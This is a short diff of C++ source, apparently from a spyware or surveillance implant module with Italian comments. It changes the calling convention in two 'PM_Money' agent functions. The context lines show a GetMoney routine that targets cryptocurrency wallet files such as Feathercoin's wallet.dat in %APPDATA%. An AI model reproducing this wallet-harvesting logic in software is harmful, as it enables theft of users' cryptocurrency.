@@ -72,7 +72,7 @@ void GetMoney()
 	GetCurrency(L"%APPDATA%\\Feathercoin\\wallet.dat", MONEY_NAMECOIN);
 }
 
-DWORD __stdcall PM_MoneyStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_MoneyStartStop(BOOL bStartFlag, BOOL bReset)
 {
 	// Questo agente non ha stato started/stopped, ma quando
 	// viene avviato esegue un'azione istantanea.
@@ -82,7 +82,7 @@ DWORD __stdcall PM_MoneyStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD __stdcall PM_MoneyInit(JSONObject elem)
+DWORD WINAPI PM_MoneyInit(JSONObject elem)
 {
 	return 1;
 }
